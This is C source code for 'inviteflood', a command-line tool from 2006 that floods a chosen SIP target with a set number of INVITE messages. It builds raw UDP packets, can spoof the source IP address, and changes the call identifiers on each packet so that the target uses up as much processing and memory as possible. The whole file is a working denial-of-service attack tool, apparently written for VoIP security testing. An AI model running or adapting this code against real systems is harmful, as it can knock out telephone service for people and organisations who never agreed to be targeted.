//-------------------------------------------------------------------------------
//
// inviteflood.c - Command line tool to attempt to flood
//                 the specified destination IP Addr with the
//                 specified number of INVITE messages. 
//
//    Copyright (C) 2006  Mark D. Collier/Mark O'Brien
//
//    This program is free software; you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation; either version 2 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program; if not, write to the Free Software
//    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
//
//   Author: Mark D. Collier/Mark O'Brien   06/09/2006  v2.0
//                   Mark D. Collier/Mark O'Brien   10/12/2004  v1.0
//         www.securelogix.com - mark.collier@securelogix.com
//         www.hackingexposedvoip.com
//
//-------------------------------------------------------------------------------

#include "hack_library.h"
#include "inviteflood.h"

int main (int argc, char *argv[] )
{
    signal ( SIGTERM, catch_signals );
    signal ( SIGINT, catch_signals  );

    if ( argc < 6 ) // at least 5 mandatory parms
    {
        usage ( );
    };

//
//  Parse the command line.
//

    while ( ( opt = getopt ( argc, argv, "a:i:s:D:S:l:v" ) ) != EOF) {
        switch ( opt ) {
            case 'a':
                psFloodUserAlias = optarg;      // Source alias.
                break;
            case 'i':
                psSrcIPv4Addr = optarg;         // Source IPV4 addr.
                break;
            case 'S':
                srcPort = atoi ( optarg );      // Source port.
                break;
            case 'D':
                destPort = atoi ( optarg );     // Destination port.
                break;
            case 'l':
                lineString = optarg;            // Line identifier, needed for SNOM.
                break;
            case 's':
                sleepTimeSec = atol ( optarg ); // Sleep btwn msgs (seconds).
                break;
            case 'v':
                bVerbose = true;                // Verbose option.
                break;
            case 'h':                           // Usage.
            case '?':
                usage();
                break;
        }
    }

//
//  getopt permutes the order of the parms in argv[] placing non-optional parms
//  at the end of argv. optind should be the index of the 1st mandatory non-optional
//  parm in argv[] and there must be exactly 5 non-optional mandatory parms.
//

    if ( optind != ( argc - 5 ) ) {
        usage();
    }

//
//  Ethernet device.
//

    psDevice = argv[optind++];

//
//  Optional source IP address.
//

    if ( psSrcIPv4Addr ) {
        psTempIPv4Addr = strdup ( psSrcIPv4Addr );

//
//      Str2IP returns the numeric IP address in network byte order.
//

        if ( Str2IP( psTempIPv4Addr, &srcIPv4Addr ) != EXIT_SUCCESS ) {
            printf ( "\nsource IPv4 addr invalid: %s\n",
                     psSrcIPv4Addr );
            free ( psTempIPv4Addr );
            usage ( );
        }

        snprintf ( srcIPv4AddrDotted, 15, psSrcIPv4Addr );

        free ( psTempIPv4Addr );
        psTempIPv4Addr = NULL;

//
//  Obtain source IP address from the specified device interface.
//

    } else {
        strcpy ( ifreq.ifr_ifrn.ifrn_name, psDevice );

        if ( ( sockfd = socket ( AF_INET, SOCK_DGRAM, IPPROTO_UDP ) ) < 0 ) {
            fprintf ( stderr,
                      "\nsocket - Couldn't allocate socket to obtain host IP addr\n" );
            CleanupAndExit ( EXIT_FAILURE );
        }

        if ( ioctl ( sockfd, SIOCGIFADDR, &ifreq ) != 0 ) {
            fprintf ( stderr,
                      "\nioctl - Couldn't read socket's IP address\n" );
            CleanupAndExit ( EXIT_FAILURE );
        }

        saptr       = (struct sockaddr_in *)&ifreq.ifr_addr;
        srcIPv4Addr = (unsigned int)saptr->sin_addr.s_addr;

//
//      Create a dotted string version of the host's IP address to use for the SIP message.
//

        ipStr = (unsigned char *)&srcIPv4Addr;

        snprintf ( srcIPv4AddrDotted,
                  15,
                  "%hu.%hu.%hu.%hu",
                  ipStr[0], ipStr[1], ipStr[2], ipStr[3] );
    }

//
//  User/extension.
//

    psUser = argv[optind++];

//
//  The domain.
//

    psDomain = argv[optind++];

//
//  Destination IP address. Str2IP returns the numeric IP address in network byte order.
//

    psDestIPv4Addr = argv[optind++];
    psTempIPv4Addr = strdup ( psDestIPv4Addr );

    if ( Str2IP ( psTempIPv4Addr, &destIPv4Addr ) != EXIT_SUCCESS ) {
        printf ( "\ndestination IPv4 addr invalid: %s\n",
                  psDestIPv4Addr );
        free ( psTempIPv4Addr );
        usage ( );
    }

    free ( psTempIPv4Addr );
    psTempIPv4Addr = NULL;

//
//  The number of packets to generate.
//

    numPackets = atoi( argv[optind++] );

    if ( numPackets < 0 ) {
        printf ( "\n\nFlood Stage (# packets) must be positive\n" );
        usage ( );
    }

//
//  In the event the operator overrode the srcPort default, check its range.
//

    if ( srcPort  < 0 || srcPort  > 65535 ) {
        printf ( "\n\nPort range = 0 to 65535\n" );
        usage ( );
    }

//
//  In the event the operator overrode the destPort default, check its range.
//

    if ( destPort  < 0 || destPort  > 65535 ) {
        printf ( "\n\nPort range = 0 to 65535\n" );
        usage ( );
    }

    //  Print summary of flood parms

    printf ( "\n%s\n", __INVITEFLOOD_VERSION );
    printf ( "%s\n",   __INVITEFLOOD_DATE );

    printf ( "\nsource IPv4 addr:port   = %s:%u", srcIPv4AddrDotted, srcPort );
    printf ( "\ndest   IPv4 addr:port   = %s:%u", psDestIPv4Addr, destPort );

    printf ( "\ntargeted UA             = %s%s%s",
             psUser,
             ( strcmp ( "", psUser ) ? "@" : ""),
             psDomain );

    if ( strcmp ( psFloodUserAlias, "" ) != 0 ) {
        printf ( "\n\nFlood User Alias: %s", psFloodUserAlias );
    }

    if ( bVerbose ) {
        printf ( "\nVerbose mode" );
    }

    printf ( "\n\nFlooding destination with %d packets\n", numPackets );

    if ( sleepTimeSec ) {
        printf ( "Sleep %f seconds between messages\n", sleepTimeSec );
    }

//
//  SDP - typical of an Avaya 4602 phone.
//

    sprintf ( sdpPayload,
        "v=0\r\n"
        "o=MxSIP 0 639859198 IN IP4 %s\r\n"
        "s=SIP Call\r\n"
        "c=IN IP4 %s\r\n"
        "t=0 0\r\n"
        "m=audio 16388 RTP/AVP 0 18 101 102 107 104 105 106 4 8 103\r\n"
        "a=rtpmap:0 PCMU/8000\r\n"
        "a=rtpmap:18 G729/8000\r\n"
        "a=rtpmap:101 BV16/8000\r\n"
        "a=rtpmap:102 BV32/16000\r\n"
        "a=rtpmap:107 L16/16000\r\n"
        "a=rtpmap:104 PCMU/16000\r\n"
        "a=rtpmap:105 PCMA/16000\r\n"
        "a=rtpmap:106 L16/8000\r\n"
        "a=rtpmap:4 G723/8000\r\n"
        "a=rtpmap:8 PCMA/8000\r\n"
        "a=rtpmap:103 telephone-event/8000\r\n"
        "a=fmtp:103 0-15\r\n"
        "a=silenceSupp:off - - - -\r\n",
        srcIPv4AddrDotted,
        srcIPv4AddrDotted );

//
//  Create a various randomly assigned values, including branch, From Tag, and Call ID.
//

    if ( ( psBranch = GetNextGuid ( ) ) == NULL ) {
        printf ("\nBranch ID failure\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

    if ( ( psFromTag = GetNextGuid ( ) ) == NULL ) {
        printf ("\nFrom Tag ID failure\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

    if ( ( psCallID = GetNextGuid ( ) ) == NULL ) {
        printf ("\nCall ID failure\n" );
        CleanupAndExit ( EXIT_FAILURE );
    }

//
//  Build the initial INVITE request.
//

    sprintf ( sipPayload,
        "INVITE sip:%s%s%s%s%s SIP/2.0\r\n"
        "Via: SIP/2.0/UDP %s:%u;branch=%s\r\n",
        psUser,
        ( strcmp ( "", psUser ) ? "@" : "" ),
        psDomain,
	( strcmp ( "", lineString ) ? ";line=" : ""),
        lineString,
        srcIPv4AddrDotted,
        srcPort,
        psBranch );

//
//  Remember the position within sipPayload of the last 10 char of the Branch ID.
//

    psInviteViaBranchLast10 = sipPayload + strlen ( sipPayload ) - 12;

//
//  Add other header lines.
//

    sprintf ( sipPayload + strlen ( sipPayload ),
        "Max-Forwards: 70\r\n"
        "Content-Length: %u\r\n"
        "To: %s%s<sip:%s%s%s:%u>%s%s\r\n"
        "From: %s%s<sip:%s%s%s:%u>;tag=%s\r\n",
        strlen ( sdpPayload ),
        psUser,
        ( strcmp ( "", psUser           ) ? " " : "" ),
        psUser,
        ( strcmp ( "", psUser           ) ? "@" : "" ),
        psDomain,
        destPort,
	( strcmp ( "", lineString       ) ? ";line=" : "" ),
        lineString,
        psFloodUserAlias,
        ( strcmp ( "", psFloodUserAlias ) ? " " : "" ),
        psFloodUserAlias,
        ( strcmp ( "", psFloodUserAlias ) ? "@" : "" ),
        srcIPv4AddrDotted, srcPort,
        psFromTag );

//
//  Remember the position within sipPayload of the last 10 char of the FromTag.
//

    psInviteFromTagLast10 = sipPayload + strlen ( sipPayload ) - 12;

//
//  Add Call ID.
//

    sprintf ( sipPayload + strlen ( sipPayload ),
        "Call-ID: %s\r\n",
        psCallID );

//
//  Remember the position within sipPayload of the last 10 char of the Call ID.
//

    psInviteCallIDLast10 = sipPayload + strlen ( sipPayload ) - 12;

//
//  Add command sequence.
//

    sprintf ( sipPayload + strlen ( sipPayload ),
        "CSeq: %010u",
        psCallID );

//
//  Remember the position within sipPayload of the start of the CSeq.
//

    psInviteCSeqLast10 = sipPayload + strlen ( sipPayload ) - 10;

//
//  Add rest of CSeq.
//

    sprintf ( sipPayload + strlen ( sipPayload ), " INVITE\r\n" );  // rest of CSeq header

//
//  Finish off INVITE.
//

    sprintf ( sipPayload + strlen ( sipPayload ),
        "Supported: timer\r\n"
        "Allow: NOTIFY\r\n"
        "Allow: REFER\r\n"
        "Allow: OPTIONS\r\n"
        "Allow: INVITE\r\n"
        "Allow: ACK\r\n"
        "Allow: CANCEL\r\n"
        "Allow: BYE\r\n"
        "Content-Type: application/sdp\r\n"
        "Contact: <sip:%s%s%s:%u>\r\n"
        "Supported: replaces\r\n"
        "User-Agent: Elite 1.0 Brcm Callctrl/1.5.1.0 MxSF/v.3.2.6.26\r\n"
        "\r\n",
        psFloodUserAlias,
        ( strcmp ( "", psFloodUserAlias) ? "@" : "" ),
        srcIPv4AddrDotted,
        srcPort );

//
//  Add the SDP.
//

    sprintf ( sipPayload + strlen ( sipPayload ), "%s", sdpPayload );
    sipPayloadSize = strlen ( sipPayload );

//
//  Initialize the library. Root privileges are required.
//

    l = libnet_init (
            LIBNET_RAW4,        // injection type
            psDevice,           // network interface
            errbuf );           // errbuf

    if ( l == NULL ) {
        fprintf ( stderr, "libnet_init() failed: %s", errbuf );
        CleanupAndExit ( EXIT_FAILURE );
    }

//
//  Build the UDP packet.
//

    udp_tag = libnet_build_udp (
		srcPort,                        // source port
		destPort,                       // destination port
		LIBNET_UDP_H + sipPayloadSize,  // total UDP packet length
		0,                              // let libnet compute checksum
                (u_int8_t *) sipPayload,        // payload
                sipPayloadSize,                 // payload length
		l,                              // libnet handle
		udp_tag );                      // ptag - 0 = build new, !0 = reuse

    if ( udp_tag == -1 ) {
        printf ( "Can't build  UDP packet: %s\n", libnet_geterror( l ) );
        CleanupAndExit ( EXIT_FAILURE );
    }
    
//
//  Build IP header.
//

    ipPacketSize = LIBNET_IPV4_H + LIBNET_UDP_H + sipPayloadSize;

    ip_tag = libnet_build_ipv4 (
            ipPacketSize,               // size
            0,                          // ip tos
            0,                          // ip id
            0,                          // fragmentation bits
            64,                         // ttl
            IPPROTO_UDP,                // protocol
            0,                          // let libnet compute checksum
            srcIPv4Addr,                // source address
            destIPv4Addr,               // destination address
            NULL,                       // payload
            0,                          // payload length
            l,                          // libnet context
            ip_tag );                   // ptag - 0 = build new, !0 = reuse
			
    if ( ip_tag == -1 ) {
        printf ( "Can't build IP header: %s\n", libnet_geterror( l ) );
        CleanupAndExit ( EXIT_FAILURE );
    }

//
//  Dump the packet if in verbose mode.
//

    if ( bVerbose ) {
        DumpPacket ( sipPayload, sipPayloadSize );
    }

//
//  Start the packet flood. Change the VIA branch ID, FromTag, Call ID, and CSeq number
//  so the target (hopefully) won't recognize that the next message is essentially a
//  redundant INVITE. We want the target to expend the max. amount of processing and
//  storage resources on each INVITE received. The cseq is incremented, converted to
//  a 10 digit ASCII string and it replaces the last 10 char of the various IDs. This
//  permits the size of the SIP/SDP payload to remain constant. Therefore, the entire
//  SIP/SDP payload does not have to be re-built for each packet of the flood. This
//  permits consecutive INVITE messages to be output as quickly as possible.
//

    for ( i = 0; i < numPackets; i++ ) {
        cseq++;
        sprintf ( psCSeq, "%010u", cseq );
        memcpy ( psInviteFromTagLast10,   psCSeq, 10 );
        memcpy ( psInviteViaBranchLast10, psCSeq, 10 );
        memcpy ( psInviteCallIDLast10,    psCSeq, 10 );
        memcpy ( psInviteCSeqLast10,      psCSeq, 10 );

        if ( bVerbose ) {
            printf ( "\n\nSIP PAYLOAD for packet %u:\n%s", i, sipPayload );
        }

//
//      Update the UDP packet.
//

        udp_tag = libnet_build_udp (
                    srcPort,                        // source port
                    destPort,                       // destination port
                    LIBNET_UDP_H + sipPayloadSize,  // total UDP packet length
                    0,                              // let libnet compute checksum
                    (u_int8_t *) sipPayload,        // payload
                    sipPayloadSize,                 // payload length
                    l,                              // libnet handle
                    udp_tag );                      // ptag - 0 = build new, !0 = reuse

        if ( udp_tag == -1 ) {
            printf ( "Can't build  UDP packet: %s\n", libnet_geterror( l ) );
            CleanupAndExit ( EXIT_FAILURE );
        }
        
        // 
        //  Note: libnet seems to have problems computing correct UDP checksums
        //             reliably. Since the UDP checksum is optional, it can be set to zeros
        //             (i.e. see the call to libnet_build_udp above) and a call to 
        //             libnet_toggle_checksum()  can be used to disable the checksum
        //             calculation by libnet
        //

        libnet_toggle_checksum ( l, udp_tag, LIBNET_OFF );

//
//      Write the packet.
//

        bytesWritten = libnet_write( l );
        if ( bytesWritten == -1 ) {
            fprintf ( stderr, "Write error: %s\n", libnet_geterror( l ) );
            CleanupAndExit ( EXIT_FAILURE );
        }

//
//  Make sure the number of written bytes jives with what we expect.
//

        if ( bytesWritten < ipPacketSize ) {
            fprintf ( stderr,
                     "Write error: libnet only wrote %d of %d bytes",
                     bytesWritten,
                     ipPacketSize );
            CleanupAndExit ( EXIT_FAILURE );
        }

//
//      Report packets sent.
//

        printf ( "\rsent: %u", i + 1 );

        if ( sleepTimeSec ) {
            printf ( "  sleeping %d seconds", sleepTimeSec );
            fflush ( stdout );
            usleep ( sleepTimeSec * 1000000 );
        }

    } // end release the flood

    CleanupAndExit ( EXIT_SUCCESS );

}  // end main

//-----------------------------------------------------------------------------
//  catch_signals
//
//  signal catcher and handler
//
//-----------------------------------------------------------------------------

void catch_signals ( int signo )
{
    switch ( signo ) {
        case	SIGINT:
        case	SIGTERM: {
            printf ( "\nexiting...\n");
            CleanupAndExit ( EXIT_SUCCESS );
        }
    }
} // end catch_signals

//-----------------------------------------------------------------------------
// CleanupAndExit
//
// Clean up and exit.
//
//-----------------------------------------------------------------------------

void CleanupAndExit ( int status )
{
    if ( sockfd > 0 ) {
        if ( bVerbose ) {
            printf ( "\nclosing socket\n" );
        }
        close( sockfd );
    }

    if ( l ) {
        libnet_destroy ( l );
        l = NULL;
    }

    printf ( "\n" );

    exit ( status );
} // end CleanupAndExit

//-------------------------------------------------------------------------------
//
// usage ( )
//
// Display command line usage.
//
//-------------------------------------------------------------------------------

void usage ( )
{
    printf ( "\n%s", __INVITEFLOOD_VERSION );
    printf ( "\n%s", __INVITEFLOOD_DATE    );

    printf ( "\n Usage:"                                                             );
    printf ( "\n Mandatory -"                                                        );
    printf ( "\n\tinterface (e.g. eth0)"                                             );
    printf ( "\n\ttarget user (e.g. \"\" or john.doe or 5000 or \"1+210-555-1212\")" );
    printf ( "\n\ttarget domain (e.g. enterprise.com or an IPv4 address)"            );
    printf ( "\n\tIPv4 addr of flood target (ddd.ddd.ddd.ddd)"                       );
    printf ( "\n\tflood stage (i.e. number of packets)"                              );
    printf ( "\n Optional -"                                                         );
    printf ( "\n\t-a flood tool \"From:\" alias (e.g. jane.doe)"                     );
    printf ( "\n\t-i IPv4 source IP address [default is IP address of interface]"    );
    printf ( "\n\t-S srcPort  (0 - 65535) [default is well-known discard port 9]"    );
    printf ( "\n\t-D destPort (0 - 65535) [default is well-known SIP port 5060]"     );
    printf ( "\n\t-l lineString line used by SNOM [default is blank]"                );
    printf ( "\n\t-s sleep time btwn INVITE msgs (usec)"                             );
    printf ( "\n\t-h help - print this usage"                                        );
    printf ( "\n\t-v verbose output mode\n"                                          );
    printf ( "\n"                                                                    );

    exit ( EXIT_FAILURE );
}
